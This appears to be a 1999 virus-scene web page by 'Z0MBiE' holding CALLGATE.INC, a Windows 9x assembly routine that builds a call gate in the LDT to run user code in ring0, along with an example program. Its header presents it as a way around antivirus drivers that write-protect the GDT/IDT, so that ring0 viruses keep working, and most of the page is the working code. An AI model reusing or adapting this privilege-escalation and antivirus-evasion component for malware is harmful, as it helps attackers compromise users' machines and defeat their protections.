<html>

<head>
<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
<title>CallGate</title>
</head>

<body text="#000000">

<p><img src="callgate.gif" width="192" height="23" alt="callgate.gif (3248 bytes)"></p>

<p><small><small><font face="Verdana">CALLGATE.INC /for Win9X/<br>
programmed by Z0MBiE<br>
release 1.01/29-IX-99<br>
This file allows you to enter ring0 via callgate building in the LDT.<br>
It will work even if GDT/IDT pages are write-protected.<br>
Why LDT is better than GDT/IDT ?<br>
'Coz LDT can not be write-protected. ;-)) YEAH, NEV00000R! HAHAHA<br>
...YOU ARE FREE TO USE THIS SOURCE/BINARY IN ANY PURPOSES IN ANY FORM...<br>
This file was written at the same day,when friend said me that some av vxds<br>
alredy can protect idt/gdt pages.<br>
So r0-viruses with old good idt residency will suck...<br>
subroutine: call_in_ring0<br>
input registers: ESI=offset of your FAR subroutine (i.e. RETF at end)<br>
registers modified: flags (DF=0)<br>
<br>
action:<br>
- call your code in ring0<br>
- all registers except flags are passed to your procedure<br>
features:<br>
- ~60 bytes of code<br>
- GDT/IDT may be write-protected, for example by AV VxDs<br>
main idea:<br>
- create callgate in the LDT<br>
bugs:<br>
- callgate is leaved in the LDT when exiting<br>
unhandled situations:<br>
- if GDT is read-protected<br>
- if LDT is write-protected<br>
- if SLDT returns 0<br>
<br>
CGS equ 8 ; CallGate Selector<br>
<br>
call_in_ring0: pushad<br>
<br>
push ebx ; EBX &lt;-- GDT.base<br>
sgdt [esp-2]<br>
pop ebx<br>
<br>
xor eax, eax ; EAX &lt;-- LDT selector<br>
sldt ax<br>
and al, not (111b) ; selector --&gt; index*8<br>
<br>
add ebx, eax ; EBX &lt;-- LDT descriptor offs<br>
<br>
mov ch, [ebx+7] ; ECX &lt;-- LDT.base<br>
mov cl, [ebx+4]<br>
shl ecx, 16<br>
mov cx, [ebx+2]<br>
<br>
lea edi, [ecx+CGS] ; EDI &lt;-- CG descriptor offs<br>
cld<br>
<br>
mov eax, esi ; build CallGate<br>
stosw<br>
mov eax, 1110110000000000b shl 16 + 28h<br>
stosd<br>
shld eax, esi, 16<br>
stosw<br>
<br>
popad<br>
<br>
db 09Ah ; call 28:&lt;esi&gt;<br>
dd 0 ; unused, any number<br>
dw CGS+100b+11b ; LDT+R3<br>
<br>
ret ; well done<br>
<br>
; - [example.asm] - - - - - - - - - - - - - - - - - - - - - - - - - - - - -&gt;8<br>
<br>
; CALLGATE.INC - example<br>
<br>
callW macro x<br>
extrn x:PROC<br>
call x<br>
endm<br>
<br>
p386<br>
model flat<br>
<br>
.data<br>
<br>
db ?<br>
<br>
.code<br>
start:<br>
<br>
int 3<br>
<br>
lea esi, dummy<br>
call call_in_ring0<br>
<br>
push -1<br>
callW ExitProcess<br>
<br>
dummy: int 3<br>
<br>
retf ; RETF !<br>
<br>
include callgate.inc<br>
<br>
end start<br>
<br>
</font></small></small></p>
</body>
</html>
